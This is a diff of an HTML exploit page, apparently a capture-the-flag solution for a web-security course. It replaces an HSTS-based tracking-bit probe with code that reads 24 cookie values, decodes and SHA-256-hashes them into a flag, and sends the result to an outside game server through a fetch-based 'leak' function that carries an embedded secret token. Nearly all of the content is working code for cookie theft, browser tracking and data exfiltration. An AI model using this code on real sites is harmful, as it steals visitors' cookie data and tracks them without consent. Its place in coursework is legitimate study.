@@ -1,26 +1,51 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>HSTS bits</title></head>
+<head>
+    <title>Secret Leaker</title>
+</head>
 <body>
-<script>
-function leak(data){
-  fetch("https://gameserver.websec.saarland/leak?secret=0ab1191eb8d8453c2663adc4869d040d&data="+encodeURIComponent(data));
-}
+    <script>
+        // Function to leak data
+        function leak(data) {
+            fetch(`https://gameserver.websec.saarland/leak?secret=0ab1191eb8d8453c2663adc4869d040d&data=${encodeURIComponent(data)}`);
+        }
 
-async function probe(n){
-  return await new Promise(r=>{
-    const img=new Image();
-    img.onload =()=>r(0);            // HTTP worked  -> bit 0
-    img.onerror=()=>r(1);            // upgraded+fail-> bit 1
-    img.src=`http://${n}.tracking.jeopardy.websec.saarland/get?${Math.random()}`;
-  });
-}
+        // Read all 24 bits from cookies
+        let bits = [];
+        for (let i = 0; i < 24; i++) {
+            const name = `bit${i}`;
+            const regex = new RegExp(`(^| )${name}=([^;]+)`);
+            const match = document.cookie.match(regex);
+            if (match) {
+                bits.push(match[2]); // '0' or '1'
+            } else {
+                bits.push('0'); // Default if cookie not found
+            }
+        }
 
-(async()=>{
-  const bits=[];
-  for(let i=0;i<24;i++) bits.push(await probe(i));
-  leak(bits.join(""));              // e.g. "11001010..."
-})();
-</script>
+        // Convert bits to string and then to 3 characters
+        const bitString = bits.join('');
+        let secret = '';
+        for (let i = 0; i < 24; i += 8) {
+            const byte = bitString.substring(i, i + 8);
+            const charCode = parseInt(byte, 2);
+            secret += String.fromCharCode(charCode);
+        }
+
+        // Compute SHA-256 hash
+        async function sha256(message) {
+            const encoder = new TextEncoder();
+            const data = encoder.encode(message);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+        }
+
+        // Leak the SWAG{hash} after computation
+        sha256(secret).then(hash => {
+            const flag = `SWAG{${hash}}`;
+            leak(flag);
+        });
+    </script>
 </body>
 </html>
